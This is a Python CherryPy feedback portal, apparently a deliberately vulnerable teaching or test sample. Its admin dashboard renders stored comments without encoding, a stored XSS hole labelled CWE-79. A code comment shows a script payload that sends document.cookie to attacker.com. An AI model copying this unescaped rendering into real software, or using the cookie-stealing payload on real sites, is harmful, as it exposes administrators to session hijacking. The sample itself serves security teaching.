import cherrypy
import logging
import sys
import uuid
from datetime import datetime

# Setup Logging for the Application
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger('CustomerFeedbackApp')

# In-Memory Database for Stored XSS Example
# This simulates a backend database where user submissions are stored.
FEEDBACK_STORE = [
    {
        "id": "fb_001",
        "author": "Alice Smith",
        "comment": "The new interface is very intuitive. Keep up the good work!",
        "date": "2023-11-20 09:14:00"
    },
    {
        "id": "fb_002",
        "author": "Bob Jones",
        "comment": "I'm having trouble finding the billing section. Please assist.",
        "date": "2023-11-21 14:32:00"
    }
]

class CustomerPortal(object):
    @cherrypy.expose
    def index(self):
        """Public endpoint for submitting feedback."""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Submit Feedback</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 40px; max-width: 600px; margin: auto; }
                .form-group { margin-bottom: 15px; }
                label { display: block; font-weight: bold; margin-bottom: 5px; }
                input[type="text"], textarea { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
                button { padding: 10px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background: #218838; }
            </style>
        </head>
        <body>
            <h2>We value your feedback!</h2>
            <form action="/submit" method="POST">
                <div class="form-group">
                    <label for="author">Name:</label>
                    <input type="text" id="author" name="author" required>
                </div>
                <div class="form-group">
                    <label for="comment">Comments:</label>
                    <textarea id="comment" name="comment" rows="5" required></textarea>
                </div>
                <button type="submit">Submit Feedback</button>
            </form>
            <br>
            <a href="/dashboard">Go to Admin Dashboard (Internal Only)</a>
        </body>
        </html>
        """

    @cherrypy.expose
    def submit(self, author=None, comment=None):
        """Endpoint to process form submissions and store them in the database."""
        if not author or not comment:
            raise cherrypy.HTTPError(400, "Missing author or comment fields.")
            
        feedback_entry = {
            "id": f"fb_{uuid.uuid4().hex[:6]}",
            "author": author,
            "comment": comment,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        logger.info(f"New feedback received from {author}")
        
        # Save the untrusted input directly into the datastore
        FEEDBACK_STORE.append(feedback_entry)
        
        return f"""
        <html>
            <body>
                <h3>Thank you for your feedback!</h3>
                <a href="/">Return to form</a>
            </body>
        </html>
        """

    @cherrypy.expose
    def dashboard(self):
        """
        VULNERABLE FUNCTION: CWE-79 Stored Cross-Site Scripting (XSS)
        This endpoint renders the administrator dashboard displaying all submitted feedback.
        User-provided data (author and comment) is read from the database and concatenated
        directly into the HTML string without any output encoding or sanitization.
        """
        logger.info("Admin dashboard accessed.")
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard - Feedback Review</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e9ecef; padding: 20px; }
                .header { background: #343a40; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
                .card { background: white; padding: 15px; border-radius: 5px; margin-bottom: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                .author { font-weight: bold; color: #007bff; }
                .date { font-size: 0.8em; color: #6c757d; }
                .comment { margin-top: 10px; font-size: 1.1em; color: #333; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>Administrator Feedback Dashboard</h2>
                <p>Review customer feedback below. Unfiltered view.</p>
            </div>
            <div class="feedback-container">
        """
        
        # VULNERABLE SINK: Concatenating untrusted, stored data (fb['author'], fb['comment'])
        # directly into the DOM. An attacker can submit a comment like:
        # <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
        # When an admin visits this dashboard, the script executes in their browser session.
        for fb in reversed(FEEDBACK_STORE):
            html += f"""
                <div class="card">
                    <div>
                        <span class="author">{fb['author']}</span> - 
                        <span class="date">{fb['date']}</span>
                    </div>
                    <div class="comment">
                        {fb['comment']}
                    </div>
                </div>
            """
            
        html += """
            </div>
            <br>
            <a href="/">Back to Public Form</a>
        </body>
        </html>
        """
        
        return html

if __name__ == '__main__':
    logger.info("Starting CherryPy Server on port 8080...")
    
    # Configure the CherryPy server to bind to all interfaces
    cherrypy.config.update({
        'server.socket_host': '0.0.0.0',
        'server.socket_port': 8080,
        'environment': 'production'
    })
    
    # Start the web application
    cherrypy.quickstart(CustomerPortal())
